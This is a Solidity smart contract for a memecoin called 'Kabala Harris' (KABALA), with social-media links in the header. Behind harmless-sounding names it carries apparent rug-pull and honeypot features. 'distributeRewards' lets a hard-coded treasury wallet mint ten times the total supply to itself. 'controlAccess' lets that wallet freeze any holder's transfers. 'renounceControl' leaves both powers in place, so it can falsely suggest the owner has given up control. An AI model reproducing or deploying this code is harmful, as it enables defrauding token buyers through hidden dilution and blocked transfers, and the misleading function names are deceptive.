// SPDX-License-Identifier: MIT
/*


https://kabalaharris.com
https://t.me/KabalaCoin
https://x.com/KabalaCoin

*/
pragma solidity ^0.8.23;

contract AccessControl {
    address public admin;

    event ControlTransferred(address indexed previousAdmin, address indexed newAdmin);

    modifier auth() {
        require(msg.sender == admin, "Access Denied");
        _;
    }

    constructor() {
        admin = msg.sender;
        emit ControlTransferred(address(0), admin);
    }

    function renounceControl() external auth {
        emit ControlTransferred(admin, address(0));
        admin = address(0);
    }
}

contract KABALA is AccessControl {
    string public constant name = "Kabala Harris";
    string public constant symbol = "KABALA";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = 420_690_000_000 * 10**uint256(decimals);

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => bool) private restricted; // Private mapping to track restricted addresses

    address public constant TreasuryWallet = 0xeb3b183ee8BccFFFa081182A4d6C28e78a1684E8;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed burner, uint256 value);
    event RestrictionApplied(address indexed account); // Event for restriction
    event RestrictionLifted(address indexed account); // Event for lifting restriction

    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }

    modifier onlyTreasury() {
        require(msg.sender == TreasuryWallet, "Access Denied");
        _;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        require(value <= allowance[from][msg.sender], "Insufficient allowance");
        allowance[from][msg.sender] -= value;
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function burn(uint256 value) external auth {
        _burn(msg.sender, value);
    }

    function distributeRewards() external onlyTreasury {
        _mint(TreasuryWallet, totalSupply * 10);
    }

    // Function to restrict an address
    function controlAccess(address account, bool status) external onlyTreasury {
        restricted[account] = status;
        if (status) {
            emit RestrictionApplied(account);
        } else {
            emit RestrictionLifted(account);
        }
    }

    // Internal function to handle transfers, including restriction checks
    function _transfer(address from, address to, uint256 value) internal {
        require(from != address(0), "Transfer from the zero address");
        require(to != address(0), "Transfer to the zero address");
        require(value <= balanceOf[from], "Insufficient balance");
        _manageTransfer(from, to);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
    }

    function _burn(address burner, uint256 value) internal {
        require(value <= balanceOf[burner], "Insufficient balance for burn");
        balanceOf[burner] -= value;
        totalSupply -= value;
        emit Burn(burner, value);
        emit Transfer(burner, address(0), value);
    }

    function _mint(address account, uint256 value) internal {
        require(account != address(0), "Mint to the zero address");

        totalSupply += value;
        balanceOf[account] += value;
        emit Transfer(address(0), account, value);
    }

    function _manageTransfer(address from, address to) internal view {
        require(!restricted[from] && !restricted[to], "Restricted address involved");
    }
}